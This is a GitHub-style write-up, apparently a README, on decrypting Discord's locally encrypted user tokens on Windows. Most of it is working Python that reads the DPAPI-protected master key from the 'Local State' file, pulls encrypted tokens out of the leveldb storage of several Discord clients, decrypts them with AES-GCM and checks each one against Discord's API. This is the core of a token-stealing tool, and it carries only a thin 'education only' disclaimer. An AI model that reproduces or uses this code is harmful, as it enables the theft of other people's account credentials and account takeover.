# Token-encryption-writeup
All the info's about token encryption in one repository
![enc](https://user-images.githubusercontent.com/104512346/188005029-78d67d63-307c-4fce-adba-7579685e7c62.png)

<br>
So, as we all know, Discord recently started encrypting User-tokens. I had them decrypted in under a day but kept it secret for a while. Now that I already shared it with friends, lets just share it with everyone

----
<br><br>
# How they do it:

Discord uses the so-called "safeStorage API" - an API provided by electron to interact with LocalStorage in a secure manner, including encryption. For more info on that, check out his <a href="https://www.electronjs.org/docs/latest/api/safe-storage">link</a>

Its really simple to get the Token with this:

- Find the key-file ("current_dir\\Local State")
- Grab the key
- Grab your encrypted Token using regex
- Use base64 & the aes-module to decrypt it. 

----
<br><br>

# How this looks like in code

- Import our modules and define our regex:
```py
import requests
import os
import json 
import base64
from re import findall
from Cryptodome.Cipher import AES # New import 1, AES
from win32crypt import CryptUnprotectData # New import 2, win32crypt

roaming = os.getenv("appdata") # Appdata
encrypted_regex = r"dQw4w9WgXcQ:[^\"]*" # encrypted token regex
```

- Write your key-functions:
```py
def decrypt_payload(cipher, payload): # decrypting our payload, in this case tokens
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv): # getting an AES Cipher
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key): # decrypting the password, or in this case token with our masterkey & buff
    try:
        iv = buff[3:15] # getting the IV
        payload = buff[15:] # the encrypted token
        cipher = generate_cipher(master_key, iv) # our cipher
        decrypted_pass = decrypt_payload(cipher, payload) # decryping that shit
        decrypted_pass = decrypted_pass[:-16].decode() # and splitting away stuff nobody asked for
        return decrypted_pass # boom
    except:
        return "ratio"

def get_token_key(path): # token encryption uses a key stored in a different folder, lets get it, shall we? :)
    with open(path, "r", encoding="utf-8") as f: # opening the key file
        local_state = f.read() # reading our file
    local_state = json.loads(local_state) # and thats our local_state value

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"]) # now we want our key
    master_key = master_key[5:] # which we will eventually get after splitting off nonesense
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1] # and using win32crypt
    return master_key # boom, key
```

- Load the Discord Paths and grab the token:
```py
paths = {
'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\'
}

for path in paths:
    for file_name in os.listdir(path): # if it is discord...
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'): # we get all leveldb files and log files
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]: # strip them
            for y in findall(encrypted_regex, line): # and find our encrypted regex
                for i in ["discordcanary", "discord", "discordptb"]: # we check all discord installs
                    try:
                        token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_token_key(roaming+ f'\\{i}\\Local State')) # to decrypt the shit
                    except:
                        pass
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token)) # and then we just check if its valid
                    if r.status_code == 200:
                        if token in tokens:
                            continue
                        print(token)
```

Thats all there is to do, lol

----
<br><br>
# Legal Disclaimer:
<br>
Please keep in mind that this is not meant for illegal purposes! This is for education only. It exists to show how broken the Discord API & their Client is. I am not liable for anything you decide to do with this, and you agree to not use it for anything illegal.
